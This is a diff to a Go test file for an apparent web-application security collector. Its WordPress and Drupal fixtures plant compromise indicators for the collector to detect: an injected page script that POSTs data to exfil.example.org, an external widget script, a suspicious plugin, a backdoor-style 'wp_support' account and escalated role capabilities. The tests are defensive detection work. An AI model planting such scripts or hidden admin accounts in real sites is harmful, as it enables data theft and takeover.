@@ -61,12 +61,15 @@ define( 'WP_DEBUG', true );
 
 func TestWordPress(t *testing.T) {
 	db := &fakeDB{answers: map[string][]map[string]string{
-		"usermeta": {{"ID": "1", "user_login": "admin", "user_email": "admin@example.com", "user_registered": "2024-01-01 10:00:00"},
-			{"ID": "7", "user_login": "wp_support", "user_email": "x@example.invalid", "user_registered": "2026-10-20 03:12:00"}},
+		"option_name = ?": {{"option_value": `a:2:{s:13:"administrator";a:2:{s:4:"name";s:13:"Administrator";s:12:"capabilities";a:1:{s:14:"manage_options";b:1;}}s:6:"editor";a:2:{s:4:"name";s:6:"Editor";s:12:"capabilities";a:2:{s:10:"edit_posts";b:1;s:14:"manage_options";b:1;}}}`}},
+		"usermeta": {{"ID": "1", "user_login": "admin", "user_email": "admin@example.com", "user_registered": "2024-01-01 10:00:00", "caps": `a:1:{s:13:"administrator";b:1;}`},
+			{"ID": "5", "user_login": "author", "user_email": "a@example.com", "caps": `a:1:{s:6:"author";b:1;}`},
+			{"ID": "7", "user_login": "wp_support", "user_email": "x@example.invalid", "user_registered": "2026-10-20 03:12:00", "caps": `a:1:{s:6:"editor";b:1;}`},
+			{"ID": "8", "user_login": "direct", "caps": `a:2:{s:10:"subscriber";b:1;s:15:"install_plugins";b:1;}`}},
 		"option_name IN": {{"option_name": "siteurl", "option_value": "https://blog.example.com"},
 			{"option_name": "active_plugins", "option_value": `a:2:{i:0;s:19:"akismet/akismet.php";i:1;s:15:"x/wp-cache.php";}`}},
-		"options WHERE option_value LIKE": {{"option_name": "widget_custom_html", "option_value": `<script src="https://cdn-stats.example.net/a.js"></script>`}},
-		"posts WHERE":                     {{"ID": "42", "post_type": "page", "post_content": `<script>fetch("https://exfil.example.org/x",{method:"POST"})</script>`}},
+		"LOWER(option_value)": {{"option_name": "widget_custom_html", "option_value": `<script src="https://cdn-stats.example.net/a.js"></script>`}},
+		"posts WHERE":         {{"ID": "42", "post_type": "page", "post_content": `<script>fetch("https://exfil.example.org/x",{method:"POST"})</script>`}},
 	}}
 	var seen dbConfig
 	res := collect(t, fstest.MapFS{"var/www/blog/wp-includes/version.php": text("<?php $wp_version = '6.6';"), "var/www/blog/wp-config.php": text(wpConfig)},
@@ -82,8 +85,13 @@ func TestWordPress(t *testing.T) {
 	if p.Database != "blog@db:3307" || strings.Contains(p.Database, "p4ss") {
 		t.Errorf("database = %q", p.Database)
 	}
-	if len(p.Admins) != 2 || p.Admins[1].Name != "wp_support" {
-		t.Errorf("admins = %+v", p.Admins)
+	var names []string
+	for _, a := range p.Admins {
+		names = append(names, a.Name)
+	}
+	// The editor role was given manage_options; "direct" holds install_plugins itself.
+	if !slices.Equal(names, []string{"admin", "wp_support", "direct"}) {
+		t.Errorf("admins = %v", names)
 	}
 	if !slices.Equal(p.Extensions, []string{"akismet/akismet.php", "x/wp-cache.php"}) || p.Settings["siteurl"] != "https://blog.example.com" {
 		t.Errorf("extensions %v settings %v", p.Extensions, p.Settings)
@@ -333,5 +341,61 @@ func TestLimitedConn(t *testing.T) {
 	_ = client.Close()
 	if !errors.Is(err, errConnLimit) || n != 3<<20 {
 		t.Errorf("read %d bytes, err %v", n, err)
+	}
+}
+
+const tcpHeader = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"
+
+// procWithDatabase simulates a mysqld (uid 999) listening on 127.0.0.1:3306 in namespace ns.
+func procWithDatabase(ns string) fstest.MapFS {
+	return fstest.MapFS{
+		"etc/passwd":       text("root:x:0:0::/root:/bin/sh\nmysql:x:999:999::/nonexistent:/bin/false\n"),
+		"proc/self/ns/net": &fstest.MapFile{Data: []byte("net:[1]"), Mode: fs.ModeSymlink},
+		"proc/88/comm":     text("mysqld\n"),
+		"proc/88/status":   text("Name:\tmysqld\nPPid:\t1\nUid:\t999\t999\t999\t999\n"),
+		"proc/88/ns/net":   &fstest.MapFile{Data: []byte(ns), Mode: fs.ModeSymlink},
+		"proc/88/fd/10":    &fstest.MapFile{Data: []byte("socket:[5000]"), Mode: fs.ModeSymlink},
+		"proc/88/net/tcp":  text(tcpHeader + "   0: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   999        0 5000 1 0 100 0 0 10 0\n"),
+		"proc/88/net/tcp6": text(tcpHeader),
+	}
+}
+
+func TestLoopbackEndpointMatchesExactAddress(t *testing.T) {
+	ctx := context.Background()
+	src := collector.Source{FS: procWithDatabase("net:[1]"), Root: "/"}
+
+	if _, addr, err := endpoint(ctx, src, dbConfig{Host: "127.0.0.1"}, nil); err != nil || addr != "127.0.0.1:3306" {
+		t.Errorf("the real server: %s %v", addr, err)
+	}
+	// Someone listening on [::1]:3306 while the server is on 127.0.0.1 does not count.
+	if _, _, err := endpoint(ctx, src, dbConfig{Host: "::1"}, nil); !errors.Is(err, errUntrustedHost) {
+		t.Errorf("[::1] accepted: %v", err)
+	}
+	if _, _, err := endpoint(ctx, src, dbConfig{Host: "127.0.0.2"}, nil); !errors.Is(err, errUntrustedHost) {
+		t.Errorf("another loopback address accepted: %v", err)
+	}
+	other := collector.Source{FS: procWithDatabase("net:[2]"), Root: "/"}
+	if _, _, err := endpoint(ctx, other, dbConfig{Host: "127.0.0.1"}, nil); !errors.Is(err, errUntrustedHost) {
+		t.Errorf("a server in another network namespace accepted: %v", err)
+	}
+}
+
+// A configuration the web user can write gets no access to root's environment.
+func TestUntrustedConfigDoesNotReadRootEnvironment(t *testing.T) {
+	var seen dbConfig
+	fsys := fstest.MapFS{
+		"var/www/site/core/lib/Drupal.php": text("const VERSION = '10.6.0';"),
+		"var/www/site/sites/default/settings.php": &fstest.MapFile{Mode: 0o644, Sys: &syscall.Stat_t{Uid: 33}, Data: []byte(`<?php
+$databases['default']['default'] = ['database' => 'd', 'username' => 'u', 'password' => getenv('ROOT_SECRET') ?: 'none', 'host' => 'localhost', 'driver' => 'mysql'];`)},
+		"proc/1/comm":    text("php-fpm\n"),
+		"proc/1/status":  text("Name:\tphp-fpm\nPPid:\t0\nUid:\t0\t0\t0\t0\n"),
+		"proc/1/environ": text("ROOT_SECRET=s3cret\x00"),
+	}
+	res := collect(t, fsys, Collector{Connect: connectTo(&fakeDB{}, &seen)})
+	if seen.Password != "none" {
+		t.Errorf("password = %q, want the literal default", seen.Password)
+	}
+	if !slices.ContainsFunc(res.Apps[0].Warnings, func(w string) bool { return strings.Contains(w, "environment variables are not used") }) {
+		t.Errorf("warnings = %v", res.Apps[0].Warnings)
 	}
 }
